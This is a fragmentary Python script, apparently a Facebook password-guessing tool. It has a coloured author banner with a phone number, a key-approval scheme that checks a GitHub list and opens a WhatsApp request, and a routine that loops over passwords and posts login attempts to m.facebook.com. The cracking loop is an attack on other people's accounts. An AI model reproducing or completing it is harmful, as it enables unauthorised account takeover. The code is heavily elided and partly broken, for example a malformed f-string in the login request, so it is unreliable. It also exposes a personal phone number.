...
def logo():
	print("""%s
           ...
           \033[1;33m ##     ## ##     ## ##     ## ########  ####
             \033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
             \033[1;93m▇▇➣    \033[1;91mAUTHOR   : ARIYAN SABBUR       \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;93mFACEBOOK : Ariyan Sabbir        \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;92mWHATSAPP : +8801568579466     \033[1;93m▇▇
...
def reg():
    ...
    try:
        ...
        reg2()
    r = requests.get('https://github.com/EROOR9/NUM/blob/main/NUM.txt').text
    if to in r:
        time.sleep(2)
        bsn_menu()
    else:
...
def reg2():
    ...
    input('\033[1;97m               PRESS ENTER  TO SEND TOKEN')
    time.sleep(3.5)
    tks = 'Dear%20ARIYAN-sir,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+id
    os.system('am start https://wa.me/+8801568579466?text=' + tks)
...
def bsn_menu():
    ...
    IP = ipm["origin"]
    print("             [*]. CREATED BY : ARIYAN SABBIR");time.sleep (0.03)
    print("             [*]. FACEBOOK   : ARIYAN SABBIR");time.sleep (0.03)
    ...
    def __metode__(self, user, __chi__, cebok):
        ...
        try:
            for pw in __chi__:
                ...
                po = session.post(f"https://m.facebook.com/', cookies=cookies, headers=headers", data = das, headers = header1, allow_redirects = False)
